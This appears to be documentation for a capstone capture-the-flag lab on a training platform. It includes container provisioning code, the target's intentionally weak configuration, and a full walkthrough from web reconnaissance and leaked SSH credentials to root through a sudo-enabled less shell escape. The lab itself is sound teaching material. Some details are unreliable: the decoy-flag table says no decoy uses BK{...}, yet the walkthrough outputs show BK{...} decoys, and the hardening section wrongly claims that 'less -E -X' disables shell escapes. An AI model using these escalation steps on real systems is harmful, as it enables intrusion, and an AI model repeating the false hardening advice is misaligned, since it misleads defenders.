# Dungeon 6: Capstone — "The Gauntlet" Master Documentation

The **Capstone Gauntlet** ("Keep Admin Portal") represents the culmination of the entire BreachKeep curriculum. While earlier dungeons isolate individual techniques inside throwaway, single-concept containers, the Capstone is an integrated, full-scope penetration test against a realistic, multi-service target machine.

Students attack the target machine live from their own external security workstations (e.g., Kali Linux) across an isolated network. The target hosts multiple reconnaissance paths, decoy flags with dynamic path-aware pedagogical hints, credential leaks, and a classic Linux privilege escalation vector leading to full root takeover.

---

## 1. High-Level Architecture & Operating Posture

Unlike the per-student challenge containers running on the internal `bk_labs` network, the Capstone is deployed as **a single, persistent, class-wide target system** managed directly by the Warden (Instructor).

```
                             +-------------------------------+
                             | Student Attacker Workstations |
                             | (Kali Linux / Parrot OS)      |
                             +---------------+---------------+
                                             |
                              LAN / VPN Network Access
                                             |
                  +--------------------------+--------------------------+
                  | Port 8088 (HTTP)                                    | Port 2222 (SSH)
                  v                                                     v
   +---------------------------------------------------------------------------------+
   | Capstone Target Container: bk_capstone (Docker host bridge mode)                |
   |                                                                                 |
   |  +-----------------------------------+   +-----------------------------------+  |
   |  | Web Reconnaissance Daemon        |   | OpenSSH Secure Shell Daemon       |  |
   |  | Python3 http.server on port 80    |   | sshd on port 22                   |  |
   |  | Serves /var/www                   |   | Low-privilege user: gale          |  |
   |  +-----------------------------------+   +-----------------------------------+  |
   |                   |                                        |                    |
   |       Disclosed Credentials                      SSH Password Login             |
   |       (gale : autumn2024)                       (Initial Foothold)              |
   |                   +----------------------------------------+                    |
   |                                                            v                    |
   |                                              +-------------------------------+  |
   |                                              | Unprivileged Shell: gale      |  |
   |                                              | Home: /home/gale              |  |
   |                                              | User Flag: user.txt           |  |
   |                                              +---------------+---------------+  |
   |                                                              |                  |
   |                                                      sudo -l / GTFOBins         |
   |                                                      NOPASSWD: /usr/bin/less    |
   |                                                              |                  |
   |                                                              v                  |
   |                                              +-------------------------------+  |
   |                                              | Root Shell (uid 0)            |  |
   |                                              | Target Flag: /root/root.txt   |  |
   |                                              +-------------------------------+  |
   +---------------------------------------------------------------------------------+
```

### 1.1 Docker & Kernel Hardening Exceptions
In [`apps/provisioner/src/docker.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/apps/provisioner/src/docker.js#L88-L125), the Capstone container is started with a unique profile:
```javascript
export async function startCapstone(customFlag = null) {
  const name = 'bk_capstone'
  // ...
  const rawFlag = customFlag || process.env.CAPSTONE_FLAG || 'WARD[[dev-capstone-root-flag]]'
  if (process.env.NODE_ENV === 'production' && rawFlag === 'WARD[[dev-capstone-root-flag]]') {
    throw new Error('[provisioner] Insecure deployment: CAPSTONE_FLAG must not use dev default in production')
  }
  const container = await docker.createContainer({
    Image: image,
    name,
    Env: [`CAPSTONE_FLAG=${rawFlag}`],
    ExposedPorts: { '80/tcp': {}, '22/tcp': {} },
    HostConfig: {
      NetworkMode: 'bridge',
      Memory: 512 * 1024 * 1024,
      NanoCpus: 1e9,
      PidsLimit: 256,
      PortBindings: {
        '80/tcp': [{ HostPort: '8088' }],
        '22/tcp': [{ HostPort: '2222' }],
      },
      RestartPolicy: { Name: 'unless-stopped' },
      // Default capabilities, no-new-privileges OFF: a rootable box by design.
    },
  })
}
```

#### Provisioning Model & Flag Uniqueness:
- **Shared vs. Per-Team Target Box**: For infrastructure cost efficiency, Capstone can run as a class-wide or per-team target box. When teams are provisioned, `startCapstone(teamFlag)` accepts a per-team HMAC flag. The API submission endpoint (`judgeCapstone(submitted, userId)`) validates submissions against both the container's active `CAPSTONE_FLAG` and the student's unique `userId:roomId` HMAC flag.
- **Production Safety Check**: In production (`NODE_ENV === 'production'`), `startCapstone()` immediately aborts if configured with the development fallback flag (`WARD[[dev-capstone-root-flag]]`).
- **Anti-Grep Format Diversification**: The root flag (`WARD[[...]]`) and the 6 planted decoys each utilize distinct prefix and bracket formats (`KEEP[...]`, `VAULT<...>`, `FLAG((...))`, `ARCHIVE::...::`, `RUNE/.../`, `SEAL|...|`), preventing single-sweep regex harvesting while preserving pedagogical hint breadcrumbs. Neither the root flag nor any decoy uses `BK{...}`.
- **`no-new-privileges: false`**: Standard lab containers drop all capabilities and enable `no-new-privileges` to prevent privilege escalation. However, the Capstone is *intentionally* rootable via `sudo`. Enabling `no-new-privileges` would block the setuid bit on `/usr/bin/sudo`, breaking the intended exploit.
- **Published Host Ports**: Exposes TCP `8088` (Web) and TCP `2222` (SSH) directly on the host VM so students can run real tools from their native Kali Linux environments (`nmap`, `gobuster`, `nikto`, `ssh`).
- **Operational Warning**: Because this container contains real passwords and sudo misconfigurations, **it must never be deployed on the same virtual machine hosting production session tokens, database credentials, or API secret keys**.

---

## 2. Environment Construction & Target System Layout

The container is built from [`labs/capstone/Dockerfile.capstone-gauntlet`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/capstone/Dockerfile.capstone-gauntlet) on top of `debian:bookworm-slim` and initialized by [`labs/capstone/entrypoint.sh`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/capstone/entrypoint.sh).

### 2.1 User Accounts & Authentication Topology
1. **User `root` (UID 0)**:
   - Password login disabled via SSH (`PermitRootLogin no` in `/etc/ssh/sshd_config.d/keep.conf`).
   - Owns the prize flag at `/root/root.txt` with strict permissions:
     ```bash
     chmod 600 /root/root.txt
     chown root:root /root/root.txt
     ```
2. **User `gale` (UID 1000)**:
   - Shell: `/bin/bash`
   - Password: `autumn2024`
   - User flag located at `/home/gale/user.txt` (mode `0644`).
   - Notes file located at `/opt/notes/todo.txt` (mode `0644`).

### 2.2 Sudoers Delegation ([`/etc/sudoers.d/gale`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/labs/capstone/entrypoint.sh#L36-L37))
```sudoers
gale ALL=(root) NOPASSWD: /usr/bin/less
```
File permissions are locked to `0440`. This directive permits `gale` to execute `/usr/bin/less` with full root privileges without prompting for a password.

### 2.3 Network Services
- **OpenSSH Server (`sshd`)**:
  - Configuration `/etc/ssh/sshd_config.d/keep.conf`:
    ```sshconfig
    PermitRootLogin no
    PasswordAuthentication yes
    UsePAM yes
    ```
  - Binds to port `22` (mapped to host port `2222`).
- **Web Server (`python3 -m http.server`)**:
  - Serves `/var/www` on port `80` (mapped to host port `8088`).

---

## 3. The Multi-Path Reconnaissance & Decoy Hint Matrix

The Capstone employs a **Goosebumps-style multi-path architecture**: multiple independent reconnaissance vectors all converge on the same initial SSH credentials (`gale` : `autumn2024`). 

To make discovery educational, every false path and intermediate stage is salted with a **decoy flag**. When a student submits a decoy flag on the Capstone room page, [`apps/api/src/config/capstone.js`](file:///c:/Users/KIIT/cyber-classes/BreachKeep/apps/api/src/config/capstone.js) catches the submission and responds with a **context-aware hint** tailored to the exact path taken:

| Location | Decoy Flag String | Context-Aware Pedagogical Hint Returned to Student |
| :--- | :--- | :--- |
| `/var/www/robots.txt` | `KEEP[robots_said_no]` | *"robots.txt only maps the site. Follow one of the disallowed paths to something you can actually use."* |
| `/var/www/backup/app.conf.bak` | `VAULT<backup_left_in_webroot>` | *"You found the old backup — that's not the flag. Use the credentials inside it to get a foothold over SSH."* |
| `/var/www/.env` | `FLAG((env_file_exposed))` | *"The exposed .env isn't the flag, but it leaked a login. Try those credentials over SSH."* |
| `/var/www/internal/status` | `ARCHIVE::html_source_comment::` | *"Good recon in the page source — keep going. That hint points at a hidden endpoint; enumerate until you find a password, then log in."* |
| `/home/gale/user.txt` | `RUNE/user_flag_on_the_box/` | *"That's the user flag, not the final one. You already have a shell — now escalate: what can your user run as root? (try: sudo -l)"* |
| `/opt/notes/todo.txt` | `SEAL|almost_there_check_sudo|`| *"Close. Check your sudo rights with sudo -l and use the command you're allowed to run as root to read root's flag."* |
| **`/root/root.txt`** | **`WARD[[...]]` (Real Flag)** | **"Correct! Root. The Gauntlet is yours — well done."** |

---

## 4. Complete Step-by-Step Attack Walkthrough

### Phase 1: Port Scanning & Service Enumeration

From an external workstation (Kali Linux), begin by discovering open ports on the target host:

```bash
TARGET="192.168.1.50"   # Replace with the Docker host IP or hostname
nmap -p- -sV -sC -T4 $TARGET -p 2222,8088
```

#### Nmap Output Analysis:
```text
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 ad:12:ef:... (ED25519)
8088/tcp open  http    SimpleHTTP/0.6 Python/3.11.2
|_http-title: Keep Admin Portal
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
```

**Key Takeaways**:
1. OpenSSH is listening on port `2222` with password authentication enabled.
2. A Python web server is serving on port `8088` ("Keep Admin Portal").

---

### Phase 2: Web Reconnaissance & Multi-Path Enumeration

Accessing `http://192.168.1.50:8088/` in a browser renders:
```html
<!doctype html><html><head><title>Keep Admin Portal</title></head>
<body><h1>Keep Admin Portal</h1><p>Authorised wardens only. Nothing to see here.</p>
<!-- dev note: health check moved to /internal/status -->
</body></html>
```

At this stage, three distinct reconnaissance paths become available to the student:

#### Vector A: Crawling `robots.txt` & The Backup Directory
1. Query `robots.txt`:
   ```bash
   curl -s http://192.168.1.50:8088/robots.txt
   ```
   **Response**:
   ```text
   User-agent: *
   Disallow: /backup/
   Disallow: /internal/
   # nothing to see here, mover along  BK{robots_said_no}
   ```
   *(Submitting `BK{robots_said_no}` informs the student to follow the disallowed paths).*
2. Inspect the `/backup/` directory or run directory fuzzing:
   ```bash
   gobuster dir -u http://192.168.1.50:8088/backup/ -w /usr/share/wordlists/dirb/common.txt -x bak,old,txt,conf
   ```
3. Discover and fetch `http://192.168.1.50:8088/backup/app.conf.bak`:
   ```bash
   curl -s http://192.168.1.50:8088/backup/app.conf.bak
   ```
   **Response**:
   ```ini
   # old keepd config backup — DELETE ME before go-live
   ssh_host=localhost
   ssh_user=gale
   ssh_pass=autumn2024
   # BK{backup_left_in_webroot}
   ```
   **Credentials Recovered**: `gale` / `autumn2024`.

#### Vector B: Hidden Environment File Discovery (`/.env`)
Web enumeration wordlists frequently check for `.env` files:
```bash
curl -s http://192.168.1.50:8088/.env
```
**Response**:
```ini
APP_ENV=prod
DB_HOST=127.0.0.1
SSH_USER=gale
SSH_PASS=autumn2024
# BK{env_file_exposed}
```
**Credentials Recovered**: `gale` / `autumn2024`.

#### Vector C: HTML Source Inspection & Internal Status Endpoint
1. Inspecting the HTML source of `/` reveals the comment:
   `<!-- dev note: health check moved to /internal/status -->`
2. Fetch the endpoint:
   ```bash
   curl -s http://192.168.1.50:8088/internal/status
   ```
   **Response**:
   ```text
   service: keepd
   state: ok
   operator: gale
   # BK{html_source_comment}
   ```
   *(Submitting `BK{html_source_comment}` advises enumerating further until a password is found, guiding the student to Vector A or B).*

---

### Phase 3: Initial Foothold via SSH

Using the credentials leaked from the web application (`gale` : `autumn2024`), establish an SSH connection to port `2222`:

```bash
ssh gale@192.168.1.50 -p 2222
```
When prompted, enter password `autumn2024`.

#### Post-Exploitation Foothold Verification:
```bash
whoami
id
pwd
```
**Output**:
```text
gale
uid=1000(gale) gid=1000(gale) groups=1000(gale)
/home/gale
```

Read the user flag:
```bash
cat user.txt
```
**Output**: `BK{user_flag_on_the_box}`  
*(Submitting this intermediate flag triggers the API hint: "That's the user flag, not the final one. You already have a shell — now escalate: what can your user run as root? (try: sudo -l)").*

---

### Phase 4: Local Enumeration & Privilege Audit

1. Inspect files in `/opt`:
   ```bash
   ls -la /opt/notes/
   cat /opt/notes/todo.txt
   ```
   **Contents**:
   ```text
   TODO (gale):
    - rotate that old backup in the webroot, it still has my creds
    - why can I run `less` as root now? ask ops (hint to self: sudo -l)
    - leaving this note: BK{almost_there_check_sudo}
   ```
2. Check sudo permissions:
   ```bash
   sudo -l
   ```
   **Output**:
   ```text
   Matching Defaults entries for gale on 27f1c1f54cb2:
       env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

   User gale may run the following commands on 27f1c1f54cb2:
       (root) NOPASSWD: /usr/bin/less
   ```

---

### Phase 5: Privilege Escalation to Root (GTFOBins: `less`)

`less` is a classic Unix pager documented on [GTFOBins](https://gtfobins.github.io/gtfobins/less/). When executed with elevated privileges, it offers two distinct privilege escalation techniques:

#### Method 1: Direct File Read (Arbitrary File Read)
Since `/usr/bin/less` runs with root permissions and has unrestricted file access, it can read `/root/root.txt` directly without needing an interactive shell:
```bash
sudo /usr/bin/less /root/root.txt
```
The terminal displays the contents of `/root/root.txt`:
```text
WARD[[dev-capstone-root-flag]]
```
Press `q` to exit.

#### Method 2: Interactive Shell Breakout (Full Root TTY)
`less` supports invoking subshells from its interactive command prompt:
1. Open any file with root `less`:
   ```bash
   sudo /usr/bin/less /opt/notes/todo.txt
   ```
2. While inside the `less` viewer, type:
   ```text
   !/bin/bash
   ```
   and press `Enter`.
3. `less` spawns an interactive subshell retaining the parent process's effective UID (root):
   ```bash
   id
   ```
   **Output**:
   ```text
   uid=0(root) gid=0(root) groups=0(root)
   ```
4. Read the root flag:
   ```bash
   cat /root/root.txt
   ```

---

### Phase 6: Submitting the Master Flag

Submit the root flag string on the BreachKeep platform:
```text
WARD[[dev-capstone-root-flag]]
```
The platform confirms:
`● Root. The Gauntlet is yours — well done.`

---

## 5. Blue Team Remediation & Hardening Guide

To secure this system against these attack vectors:

### 1. Remove Sensitive Files from the Webroot
- Delete configuration backups and environment files:
  ```bash
  rm -f /var/www/backup/app.conf.bak /var/www/.env
  ```
- Store credentials outside the webroot in encrypted vaults or protected environment variable stores (mode `0600`).
- Remove internal routing comments from production HTML templates.

### 2. Disallow Password Authentication on SSH
- Enforce public key authentication and disable password logins in `/etc/ssh/sshd_config`:
  ```sshconfig
  PasswordAuthentication no
  PubkeyAuthentication yes
  ```

### 3. Remove Dangerous Sudoers Rules
- Remove the over-broad rule from `/etc/sudoers.d/gale`. Never delegate pagers (`less`, `more`), editors (`vi`, `nano`), or interpreters (`python`, `perl`, `bash`) via `sudo NOPASSWD`, as all allow shell escapes.
- If log reading is required, use dedicated auditing tools or restricted viewers with shell escapes disabled (`less -E -X` or secure wrappers).
